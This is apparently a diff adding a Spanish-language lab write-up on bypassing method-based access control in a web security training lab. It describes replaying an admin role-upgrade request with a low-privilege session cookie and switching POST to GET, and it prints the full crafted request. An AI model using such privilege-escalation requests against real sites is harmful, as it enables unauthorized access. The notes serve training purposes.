@@ -288,5 +288,39 @@ X-Original-URL: /admin/delete
 https://security.stackexchange.com/questions/229928/x-original-url-and-x-rewrite-url-related-vulnerabilities
 
 
+# Method-based access control can be circumvented
 
+Para este laboratorio primero se entra para upgretear a un usuario por ejemplo carlos
+
+
+Despues de tienene la petiion que hace esta funcion se manda al repeater
+Abrimos una pestaña de incognito e iniciamos como wiener tomamos la peticion
+y le ponermos un POSTx al final nos dice no autorizados osea que si esta queriendo hacerla
+ponemos a la cookie del usuario y finalmente cambiamos la peticion de tipo a GET y se hace el cambio
+
+
+```
+
+GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
+Host: 0af10097042eda04c16d7a8b006f00e4.web-security-academy.net
+Cookie: session=aBt9iVoiZzjZgl04rRyg1tfnhUKijZaC
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: https://0af10097042eda04c16d7a8b006f00e4.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0af10097042eda04c16d7a8b006f00e4.web-security-academy.net/admin
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9
+Connection: close
+
+
+```
 
